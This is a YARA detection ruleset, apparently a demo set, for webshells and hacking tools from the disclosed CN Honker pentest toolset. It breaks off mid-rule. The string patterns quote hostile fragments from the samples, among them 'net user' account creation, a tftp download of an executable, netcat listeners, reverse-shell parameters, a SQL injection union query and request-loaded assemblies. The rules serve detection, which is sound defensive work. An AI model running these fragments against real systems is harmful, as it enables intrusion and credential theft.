rule CN_Honker_Webshell_ASP_hy2006a_RID31A9 : CHINA DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Webshell from CN Honker Pentest Toolset - file hy2006a.txt"
      author = "Florian Roth"
      reference = "Disclosed CN Honker Pentest Toolset"
      date = "2015-06-23 13:32:01"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "CHINA, DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s15 = "Const myCmdDotExeFile = \"command.com\"" fullword ascii
      $s16 = "If LCase(appName) = \"cmd.exe\" And appArgs <> \"\" Then" fullword ascii
   condition: 
      filesize < 406KB and all of them
} 

rule CN_Honker_Webshell_PHP_php1_RID311C : CHINA DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Webshell from CN Honker Pentest Toolset - file php1.txt"
      author = "Florian Roth"
      reference = "Disclosed CN Honker Pentest Toolset"
      date = "2015-06-23 13:08:31"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "CHINA, DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s7 = "$sendbuf = \"site exec \".$_POST[\"SUCommand\"].\"\\r\\n\";" fullword ascii
      $s8 = "elseif(function_exists('passthru')){@ob_start();@passthru($cmd);$res = @ob_get_c" ascii
      $s18 = "echo Exec_Run($perlpath.' /tmp/spider_bc '.$_POST['yourip'].' '.$_POST['yourport" ascii
   condition: 
      filesize < 621KB and all of them
} 

rule CN_Honker_Webshell_jspshell2_RID31F3 : CHINA DEMO T1007 T1086 T1100 T1136 WEBSHELL {
   meta:
      description = "Webshell from CN Honker Pentest Toolset - file jspshell2.txt"
      author = "Florian Roth"
      reference = "Disclosed CN Honker Pentest Toolset"
      date = "2015-06-23 13:44:21"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "CHINA, DEMO, T1007, T1086, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s10 = "if (cmd == null) cmd = \"cmd.exe /c set\";" fullword ascii
      $s11 = "if (program == null) program = \"cmd.exe /c net start > \"+SHELL_DIR+\"/Log.txt" ascii
   condition: 
      filesize < 424KB and all of them
} 

rule CN_Honker_Webshell_Tuoku_script_mysql_RID35FD : CHINA DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Webshell from CN Honker Pentest Toolset - file mysql.aspx"
      author = "Florian Roth"
      reference = "Disclosed CN Honker Pentest Toolset"
      date = "2015-06-23 16:36:41"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "CHINA, DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "txtpassword.Attributes.Add(\"onkeydown\", \"SubmitKeyClick('btnLogin');\");" fullword ascii
      $s2 = "connString = string.Format(\"Host = {0}; UserName = {1}; Password = {2}; Databas" ascii
   condition: 
      filesize < 202KB and all of them
} 

rule CN_Honker_Webshell_PHP_php9_RID3124 : CHINA DEMO T1087 T1100 T1136 WEBSHELL {
   meta:
      description = "Webshell from CN Honker Pentest Toolset - file php9.txt"
      author = "Florian Roth"
      reference = "Disclosed CN Honker Pentest Toolset"
      date = "2015-06-23 13:09:51"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "CHINA, DEMO, T1087, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "Str[17] = \"select shell('c:\\windows\\system32\\cmd.exe /c net user b4che10r ab" ascii
   condition: 
      filesize < 1087KB and all of them
} 

rule CN_Honker_Webshell_portRecall_jsp_RID3420 : CHINA DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Webshell from CN Honker Pentest Toolset - file jsp.txt"
      author = "Florian Roth"
      reference = "Disclosed CN Honker Pentest Toolset"
      date = "2015-06-23 15:17:11"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "CHINA, DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "lcx.jsp?localIP=202.91.246.59&localPort=88&remoteIP=218.232.111.187&remotePort=2" ascii
   condition: 
      filesize < 1KB and all of them
} 

rule CN_Honker_Webshell_ASPX_aspx3_RID31E6 : CHINA DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Webshell from CN Honker Pentest Toolset - file aspx3.txt"
      author = "Florian Roth"
      reference = "Disclosed CN Honker Pentest Toolset"
      date = "2015-06-23 13:42:11"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "CHINA, DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "Process p1 = Process.Start(\"\\\"\" + txtRarPath.Value + \"\\\"\", \" a -y -k -m" ascii
      $s12 = "if (_Debug) System.Console.WriteLine(\"\\ninserting filename into CDS:" ascii
   condition: 
      filesize < 100KB and all of them
} 

rule CN_Honker_Webshell_ASPX_shell_shell_RID3486 : CHINA DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Webshell from CN Honker Pentest Toolset - file shell.aspx"
      author = "Florian Roth"
      reference = "Disclosed CN Honker Pentest Toolset"
      date = "2015-06-23 15:34:11"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "CHINA, DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "<%try{ System.Reflection.Assembly.Load(Request.BinaryRead(int.Parse(Request.Cook" ascii
      $s1 = "<%@ Page Language=\"C#\" ValidateRequest=\"false\" %>" fullword ascii
   condition: 
      filesize < 1KB and all of them
} 

rule CN_Honker_Webshell__php1_php7_php9_RID33F2 : CHINA DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Webshell from CN Honker Pentest Toolset - from files php1.txt, php7.txt, php9.txt"
      author = "Florian Roth"
      reference = "Disclosed CN Honker Pentest Toolset"
      date = "2015-06-23 15:09:31"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "CHINA, DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "<a href=\"?s=h&o=wscript\">[WScript.shell]</a> " fullword ascii
      $s2 = "document.getElementById('cmd').value = Str[i];" fullword ascii
      $s3 = "Str[7] = \"copy c:\\\\\\\\1.php d:\\\\\\\\2.php\";" fullword ascii
   condition: 
      filesize < 300KB and all of them
} 

rule CN_Honker_Webshell__Serv_U_by_Goldsun_asp3_Serv_U_asp_RID3BB0 : CHINA DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Webshell from CN Honker Pentest Toolset - from files Serv-U_by_Goldsun.asp, asp3.txt, Serv-U asp.txt"
      author = "Florian Roth"
      reference = "Disclosed CN Honker Pentest Toolset"
      date = "2015-06-23 20:39:51"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "CHINA, DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "c.send loginuser & loginpass & mt & deldomain & quit" fullword ascii
      $s2 = "loginpass = \"Pass \" & pass & vbCrLf" fullword ascii
      $s3 = "b.send \"User go\" & vbCrLf & \"pass od\" & vbCrLf & \"site exec \" & cmd & vbCr" ascii
   condition: 
      filesize < 444KB and all of them
} 

rule CN_Honker_Webshell__asp4_asp4_MSSQL__MSSQL__RID36A6 : CHINA DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Webshell from CN Honker Pentest Toolset - from files asp4.txt, asp4.txt, MSSQL_.asp, MSSQL_.asp"
      author = "Florian Roth"
      reference = "Disclosed CN Honker Pentest Toolset"
      date = "2015-06-23 17:04:51"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "CHINA, DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "\"<form name=\"\"searchfileform\"\" action=\"\"?action=searchfile\"\" method=\"" ascii
      $s1 = "\"<TD ALIGN=\"\"Left\"\" colspan=\"\"5\"\">[\"& DbName & \"]" fullword ascii
      $s2 = "Set Conn = Nothing " fullword ascii
   condition: 
      filesize < 341KB and all of them
} 

rule CN_Honker_Webshell__Injection_jmCook_jmPost_ManualInjection_RID3E5C : CHINA DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Webshell from CN Honker Pentest Toolset - from files Injection.exe, jmCook.asp, jmPost.asp, ManualInjection.exe"
      author = "Florian Roth"
      reference = "Disclosed CN Honker Pentest Toolset"
      date = "2015-06-23 22:33:51"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "CHINA, DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "response.write  PostData(JMUrl,JmStr,JmCok,JmRef)" fullword ascii
      $s2 = "strReturn=Replace(strReturn,chr(43),\"%2B\")  'JMDCW" fullword ascii
   condition: 
      filesize < 7342KB and all of them
} 

rule CN_Honker_Webshell_cmfshell_RID31AA : CHINA DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Webshell from CN Honker Pentest Toolset - file cmfshell.cmf"
      author = "Florian Roth"
      reference = "Disclosed CN Honker Pentest Toolset"
      date = "2015-06-23 13:32:11"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "CHINA, DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "<cfexecute name=\"C:\\Winnt\\System32\\cmd.exe\"" fullword ascii
      $s2 = "<form action=\"<cfoutput>#CGI.SCRIPT_NAME#</cfoutput>\" method=\"post\">" fullword ascii
   condition: 
      filesize < 4KB and all of them
} 

rule CN_Honker_Webshell_PHP_php4_RID311F : CHINA DEMO FILE T1100 T1136 WEBSHELL {
   meta:
      description = "Webshell from CN Honker Pentest Toolset - file php4.txt"
      author = "Florian Roth"
      reference = "Disclosed CN Honker Pentest Toolset"
      date = "2015-06-23 13:09:01"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "CHINA, DEMO, FILE, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "nc -l -vv -p port(" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x4850 and filesize < 1KB and all of them
} 

rule CN_Honker_Webshell_Linux_2_6_Exploit_RID34D6 : CHINA DEMO LINUX T1100 T1136 WEBSHELL {
   meta:
      description = "Webshell from CN Honker Pentest Toolset - file 2.6.9"
      author = "Florian Roth"
      reference = "Disclosed CN Honker Pentest Toolset"
      date = "2015-06-23 15:47:31"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "CHINA, DEMO, LINUX, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "[+] Failed to get root :( Something's wrong.  Maybe the kernel isn't vulnerable?" fullword ascii
   condition: 
      filesize < 56KB and all of them
} 

rule CN_Honker_Webshell_ASP_asp2_RID3115 : CHINA DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Webshell from CN Honker Pentest Toolset - file asp2.txt"
      author = "Florian Roth"
      reference = "Disclosed CN Honker Pentest Toolset"
      date = "2015-06-23 13:07:21"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "CHINA, DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "<%=server.mappath(request.servervariables(\"script_name\"))%>" fullword ascii
      $s2 = "webshell</font> <font color=#00FF00>" fullword ascii
      $s3 = "Userpwd = \"admin\"   'User Password" fullword ascii
   condition: 
      filesize < 10KB and all of them
} 

rule CN_Honker_Webshell_FTP_MYSQL_MSSQL_SSH_RID3477 : CHINA DEMO T1021 T1100 T1136 WEBSHELL {
   meta:
      description = "Webshell from CN Honker Pentest Toolset - file FTP MYSQL MSSQL SSH.txt"
      author = "Florian Roth"
      reference = "Disclosed CN Honker Pentest Toolset"
      date = "2015-06-23 15:31:41"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "CHINA, DEMO, T1021, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "$_SESSION['hostlist'] = $hostlist = $_POST['hostlist'];" fullword ascii
      $s2 = "Codz by <a href=\"http://www.sablog.net/blog\">4ngel</a><br />" fullword ascii
      $s3 = "if ($conn_id = @ftp_connect($host, $ftpport)) {" fullword ascii
      $s4 = "$_SESSION['sshport'] = $mssqlport = $_POST['sshport'];" fullword ascii
      $s5 = "<title>ScanPass(FTP/MYSQL/MSSQL/SSH) by 4ngel</title>" fullword ascii
   condition: 
      filesize < 20KB and 3 of them
} 

rule CN_Honker_Webshell_ASP_shell_RID31B7 : CHINA DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Webshell from CN Honker Pentest Toolset - file shell.txt"
      author = "Florian Roth"
      reference = "Disclosed CN Honker Pentest Toolset"
      date = "2015-06-23 13:34:21"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "CHINA, DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "xPost.Open \"GET\",\"http://www.i0day.com/1.txt\",False //" fullword ascii
      $s2 = "sGet.SaveToFile Server.MapPath(\"test.asp\"),2 //" fullword ascii
      $s3 = "http://hi.baidu.com/xahacker/fuck.txt" fullword ascii
   condition: 
      filesize < 1KB and all of them
} 

rule CN_Honker_Webshell_PHP_php7_RID3122 : CHINA DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Webshell from CN Honker Pentest Toolset - file php7.txt"
      author = "Florian Roth"
      reference = "Disclosed CN Honker Pentest Toolset"
      date = "2015-06-23 13:09:31"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "CHINA, DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "---> '.$ports[$i].'<br>'; ob_flush(); flush(); } } echo '</div>'; return true; }" ascii
      $s1 = "$getfile = isset($_POST['downfile']) ? $_POST['downfile'] : ''; $getaction = iss" ascii
   condition: 
      filesize < 300KB and all of them
} 

rule CN_Honker_Webshell_ASP_rootkit_RID32AB : CHINA DEMO T1014 T1087 T1100 T1136 WEBSHELL {
   meta:
      description = "Webshell from CN Honker Pentest Toolset - file rootkit.txt"
      author = "Florian Roth"
      reference = "Disclosed CN Honker Pentest Toolset"
      date = "2015-06-23 14:15:01"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "CHINA, DEMO, T1014, T1087, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "set ss=zsckm.get(\"Win32_ProcessSta\"&uyy&\"rtup\")" fullword ascii
      $s1 = "If jzgm=\"\"Then jzgm=\"cmd.exe /c net user\"" fullword ascii
   condition: 
      filesize < 80KB and all of them
} 

rule CN_Honker_Webshell_jspshell_RID31C1 : CHINA DEMO T1086 T1100 T1136 WEBSHELL {
   meta:
      description = "Webshell from CN Honker Pentest Toolset - file jspshell.txt"
      author = "Florian Roth"
      reference = "Disclosed CN Honker Pentest Toolset"
      date = "2015-06-23 13:36:01"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "CHINA, DEMO, T1086, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "else if(Z.equals(\"M\")){String[] c={z1.substring(2),z1.substring(0,2),z2};Proce" ascii
      $s2 = "String Z=EC(request.getParameter(Pwd)+\"\",cs);String z1=EC(request.getParameter" ascii
   condition: 
      filesize < 30KB and all of them
} 

rule CN_Honker_Webshell_Serv_U_serv_u_RID33A3 : CHINA DEMO T1085 T1100 T1136 WEBSHELL {
   meta:
      description = "Webshell from CN Honker Pentest Toolset - file serv-u.php"
      author = "Florian Roth"
      reference = "Disclosed CN Honker Pentest Toolset"
      date = "2015-06-23 14:56:21"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "CHINA, DEMO, T1085, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "@readfile(\"c:\\\\winnt\\\\system32\\" fullword ascii
      $s2 = "$sendbuf = \"PASS \".$_POST[\"password\"].\"\\r\\n\";" fullword ascii
      $s3 = "$cmd=\"cmd /c rundll32.exe $path,install $openPort $activeStr\";" fullword ascii
   condition: 
      filesize < 435KB and all of them
} 

rule CN_Honker_Webshell_WebShell_RID3172 : CHINA DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Webshell from CN Honker Pentest Toolset - file WebShell.cgi"
      author = "Florian Roth"
      reference = "Disclosed CN Honker Pentest Toolset"
      date = "2015-06-23 13:22:51"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "CHINA, DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "$login = crypt($WebShell::Configuration::password, $salt);" fullword ascii
      $s2 = "my $error = \"This command is not available in the restricted mode.\\n\";" fullword ascii
      $s3 = "warn \"command: '$command'\\n\";" fullword ascii
   condition: 
      filesize < 30KB and 2 of them
} 

rule CN_Honker_Webshell_Tuoku_script_mssql_2_RID3688 : CHINA DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Webshell from CN Honker Pentest Toolset - file mssql.asp"
      author = "Florian Roth"
      reference = "Disclosed CN Honker Pentest Toolset"
      date = "2015-06-23 16:59:51"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "CHINA, DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "sqlpass=request(\"sqlpass\")" fullword ascii
      $s2 = "set file=fso.createtextfile(server.mappath(request(\"filename\")),8,true)" fullword ascii
      $s3 = "<blockquote> ServerIP:&nbsp;&nbsp;&nbsp;" fullword ascii
   condition: 
      filesize < 3KB and all of them
} 

rule CN_Honker_Webshell_ASP_asp1_RID3114 : CHINA DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Webshell from CN Honker Pentest Toolset - file asp1.txt"
      author = "Florian Roth"
      reference = "Disclosed CN Honker Pentest Toolset"
      date = "2015-06-23 13:07:11"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "CHINA, DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "SItEuRl=" ascii
      $s2 = "<%@ LANGUAGE = VBScript.Encode %><%" fullword ascii
      $s3 = "Server.ScriptTimeout=" ascii
   condition: 
      filesize < 200KB and all of them
} 

rule CN_Honker_MAC_IPMAC_RID2D61 : CHINA DEMO EXE FILE HKTL T1136 {
   meta:
      description = "Sample from CN Honker Pentest Toolset - file IPMAC.exe"
      author = "Florian Roth"
      reference = "Disclosed CN Honker Pentest Toolset"
      date = "2015-06-23 10:29:21"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "CHINA, DEMO, EXE, FILE, HKTL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "Http://Www.YrYz.Net" fullword wide
      $s2 = "IpMac.txt" fullword ascii
      $s3 = "192.168.0.1" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 267KB and all of them
} 

rule CN_Honker_GetSyskey_RID2E6F : CHINA DEMO EXE FILE HKTL T1136 {
   meta:
      description = "Sample from CN Honker Pentest Toolset - file GetSyskey.exe"
      author = "Florian Roth"
      reference = "Disclosed CN Honker Pentest Toolset"
      date = "2015-06-23 11:14:21"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "CHINA, DEMO, EXE, FILE, HKTL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s2 = "GetSyskey <SYSTEM registry file> [Output system key file]" fullword ascii
      $s4 = "The system key file \"%s\" is created." fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 40KB and all of them
} 

rule CN_Honker_Churrasco_RID2E71 : CHINA DEMO EXE FILE HKTL T1136 {
   meta:
      description = "Sample from CN Honker Pentest Toolset - file Churrasco.exe"
      author = "Florian Roth"
      reference = "Disclosed CN Honker Pentest Toolset"
      date = "2015-06-23 11:14:41"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "CHINA, DEMO, EXE, FILE, HKTL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "HEAD9 /" ascii
      $s1 = "logic_er" fullword ascii
      $s6 = "proggam" fullword ascii
      $s16 = "DtcGetTransactionManagerExA" fullword ascii
      $s17 = "GetUserNameA" fullword ascii
      $s18 = "OLEAUT" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 1276KB and all of them
} 

rule CN_Honker_mysql_injectV1_1_Creak_RID3335 : CHINA DEMO EXE FILE HKTL T1136 {
   meta:
      description = "Sample from CN Honker Pentest Toolset - file mysql_injectV1.1_Creak.exe"
      author = "Florian Roth"
      reference = "Disclosed CN Honker Pentest Toolset"
      date = "2015-06-23 14:38:01"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "CHINA, DEMO, EXE, FILE, HKTL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "1http://192.169.200.200:2217/mysql_inject.php?id=1" fullword ascii
      $s12 = "OnGetPassword" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 5890KB and all of them
} 

rule CN_Honker_ASP_wshell_RID2E99 : CHINA DEMO FILE HKTL T1136 {
   meta:
      description = "Sample from CN Honker Pentest Toolset - file wshell.txt"
      author = "Florian Roth"
      reference = "Disclosed CN Honker Pentest Toolset"
      date = "2015-06-23 11:21:21"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "CHINA, DEMO, FILE, HKTL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "<%@ LANGUAGE = VBScript.Encode %><%" fullword ascii
      $s1 = "UserPass=" 
      $s2 = "VerName=" 
      $s3 = "StateName=" 
   condition: 
      uint16 ( 0 ) == 0x253c and filesize < 200KB and all of them
} 

rule CN_Honker_exp_iis7_RID2DEF : CHINA DEMO EXE FILE HKTL T1136 {
   meta:
      description = "Sample from CN Honker Pentest Toolset - file iis7.exe"
      author = "Florian Roth"
      reference = "Disclosed CN Honker Pentest Toolset"
      date = "2015-06-23 10:53:01"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "CHINA, DEMO, EXE, FILE, HKTL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "\\\\localhost" fullword ascii
      $s1 = "iis.run" fullword ascii
      $s3 = ">Could not connecto %s" fullword ascii
      $s4 = "WinSta0\\Default" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 60KB and all of them
} 

rule CN_Honker_SegmentWeapon_RID3004 : CHINA DEMO EXE FILE HKTL T1136 {
   meta:
      description = "Sample from CN Honker Pentest Toolset - file SegmentWeapon.exe"
      author = "Florian Roth"
      reference = "Disclosed CN Honker Pentest Toolset"
      date = "2015-06-23 12:21:51"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "CHINA, DEMO, EXE, FILE, HKTL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "C:\\WINDOWS\\system32\\msvbvm60.dll\\3" fullword ascii
      $s1 = "http://www.nforange.com/inc/1.asp?" fullword wide
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them
} 

rule CN_Honker_Alien_iispwd_RID2F9F : CHINA DEMO HKTL T1136 {
   meta:
      description = "Sample from CN Honker Pentest Toolset - file iispwd.vbs"
      author = "Florian Roth"
      reference = "Disclosed CN Honker Pentest Toolset"
      date = "2015-06-23 12:05:01"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "CHINA, DEMO, HKTL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "set IIs=objservice.GetObject(\"IIsWebServer\",childObjectName)" fullword ascii
      $s1 = "wscript.echo \"from : http://www.xxx.com/\" &vbTab&vbCrLf" fullword ascii
   condition: 
      filesize < 3KB and all of them
} 

rule CN_Honker_Md5CrackTools_RID2FA2 : CHINA DEMO EXE FILE HKTL T1136 {
   meta:
      description = "Sample from CN Honker Pentest Toolset - file Md5CrackTools.exe"
      author = "Florian Roth"
      reference = "Disclosed CN Honker Pentest Toolset"
      date = "2015-06-23 12:05:31"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "CHINA, DEMO, EXE, FILE, HKTL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)" fullword ascii
      $s2 = ",<a href='index.php?c=1&type=md5&hash=" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 4580KB and all of them
} 

rule CN_Honker_CoolScan_scan_RID2FDD : CHINA DEMO EXE FILE HKTL T1136 {
   meta:
      description = "Sample from CN Honker Pentest Toolset - file scan.exe"
      author = "Florian Roth"
      reference = "Disclosed CN Honker Pentest Toolset"
      date = "2015-06-23 12:15:21"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "CHINA, DEMO, EXE, FILE, HKTL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "User-agent:\\s{0,32}(huasai|huasai/1.0|\\*)" fullword ascii
      $s1 = "scan web.exe" fullword wide
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 3680KB and all of them
} 

rule CN_Honker_COOKIE_CooKie_RID2F1A : CHINA DEMO EXE FILE HKTL T1136 {
   meta:
      description = "Sample from CN Honker Pentest Toolset - file CooKie.exe"
      author = "Florian Roth"
      reference = "Disclosed CN Honker Pentest Toolset"
      date = "2015-06-23 11:42:51"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "CHINA, DEMO, EXE, FILE, HKTL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s4 = "-1 union select 1,username,password,4,5,6,7,8,9,10 from admin" fullword ascii
      $s5 = "CooKie.exe" fullword wide
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 360KB and all of them
} 

rule CN_Honker_wwwscan_1_wwwscan_RID31CA : CHINA DEMO EXE FILE HKTL T1136 {
   meta:
      description = "Sample from CN Honker Pentest Toolset - file wwwscan.exe"
      author = "Florian Roth"
      reference = "Disclosed CN Honker Pentest Toolset"
      date = "2015-06-23 13:37:31"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "CHINA, DEMO, EXE, FILE, HKTL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "%s www.target.com -p 8080 -m 10 -t 16" fullword ascii
      $s3 = "GET /nothisexistpage.html HTTP/1.1" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 180KB and all of them
} 

rule CN_Honker_D_injection_V2_32_RID30D8 : CHINA DEMO EXE FILE HKTL T1136 {
   meta:
      description = "Sample from CN Honker Pentest Toolset - file D_injection_V2.32.exe"
      author = "Florian Roth"
      reference = "Disclosed CN Honker Pentest Toolset"
      date = "2015-06-23 12:57:11"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "CHINA, DEMO, EXE, FILE, HKTL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "Missing %s property(CommandText does not return a result set{Error creating obje" wide
      $s1 = "/tftp -i 219.134.46.245 get 9493.exe c:\\9394.exe" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 5000KB and all of them
} 

rule CN_Honker_net_priv_esc2_RID2FFA : CHINA DEMO EXE FILE HKTL T1136 {
   meta:
      description = "Sample from CN Honker Pentest Toolset - file net-priv-esc2.exe"
      author = "Florian Roth"
      reference = "Disclosed CN Honker Pentest Toolset"
      date = "2015-06-23 12:20:11"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "CHINA, DEMO, EXE, FILE, HKTL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "Usage:%s username password" fullword ascii
      $s2 = "<www.darkst.com>" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 17KB and all of them
} 

rule CN_Honker_Oracle_v1_0_Oracle_RID3167 : CHINA DEMO EXE FILE HKTL T1136 {
   meta:
